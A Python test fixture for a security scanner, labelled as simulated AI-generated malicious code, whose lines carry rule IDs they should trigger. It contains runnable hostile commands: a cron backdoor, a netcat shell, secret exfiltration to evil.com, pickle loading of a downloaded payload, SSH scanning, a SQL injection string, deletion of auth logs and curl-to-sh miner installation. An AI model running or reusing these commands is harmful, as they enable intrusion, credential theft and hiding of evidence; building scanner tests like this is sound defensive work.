#!/usr/bin/env python3
"""
Simulated AI-generated malicious code
This represents the type of dangerous code that AI might generate
Should trigger multiple high-severity findings
"""
import base64
import os
import pickle
import subprocess
import sys

import requests


class MaliciousAICode:
    def __init__(self):
        self.c2_server = "http://command-control.evil.com"
        self.backdoor_port = 4444

    def establish_persistence(self):
        """Create backdoor persistence"""
        # PY004_OS_SYSTEM - shell command execution
        os.system("echo 'malicious_payload' > /etc/cron.d/backdoor")

        # PY005_SUBPROCESS_SHELL_TRUE - shell injection
        subprocess.run(f"nc -l {self.backdoor_port} | sh", shell=True)

    def exfiltrate_secrets(self):
        """Steal and exfiltrate sensitive data"""
        # PY030_PRINT_SECRET - expose secrets
        db_password = dbutils.secrets.get("database-password")
        api_token = dbutils.secrets.get("service-api-token")

        print(f"Exfiltrating: {db_password}")
        print(f"Token: {api_token}")

        # PY010_PLAIN_HTTP + PY011_OUTBOUND_DOMAIN - send to attacker
        requests.post(
            f"{self.c2_server}/exfil",
            data={
                "db_pass": db_password,
                "api_token": api_token,
                "hostname": os.environ.get("HOSTNAME", "unknown"),
            },
        )

    def download_payload(self):
        """Download and execute additional malware"""
        # PY012_SSL_VERIFY_FALSE + PY011_OUTBOUND_DOMAIN
        payload_response = requests.get(
            "https://malware-distribution.net/payload.bin", verify=False
        )

        # PY003_UNSAFE_DESERIALIZE - execute untrusted code
        malicious_payload = pickle.loads(payload_response.content)
        return malicious_payload

    def lateral_movement(self):
        """Spread to other systems"""
        # PY001_FORBID_CALL - dynamic code execution
        network_scan = """
        import socket
        for ip in range(1, 255):
            sock = socket.socket()
            result = sock.connect_ex(('192.168.1.' + str(ip), 22))
            if result == 0: print('192.168.1.' + str(ip))
        """
        exec(network_scan)

        # PY020_SQL_CONCAT - SQL injection for privilege escalation
        target_user = "admin'; DROP TABLE users; --"
        spark.sql(f"SELECT * FROM access_control WHERE user = '{target_user}'")

    def cover_tracks(self):
        """Hide evidence of compromise"""
        # Multiple dangerous operations
        os.system("rm -rf /var/log/auth.log")
        os.system("history -c")
        subprocess.run("find /tmp -name '*.py' -delete", shell=True)

    def deploy_cryptominer(self):
        """Install cryptocurrency miner"""
        # PY040_HARDCODED_SECRET - embed wallet address
        os.environ["WALLET_ADDRESS"] = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

        # Download miner from suspicious source
        miner_url = "http://crypto-miners.darkweb.onion/xmrig"
        subprocess.run(f"curl {miner_url} | sh", shell=True)


def main():
    """Main attack sequence"""
    print("Initiating AI-generated attack sequence...")

    malware = MaliciousAICode()
    malware.establish_persistence()
    malware.exfiltrate_secrets()
    payload = malware.download_payload()
    malware.lateral_movement()
    malware.cover_tracks()
    malware.deploy_cryptominer()

    print("Attack sequence complete")


if __name__ == "__main__":
    main()
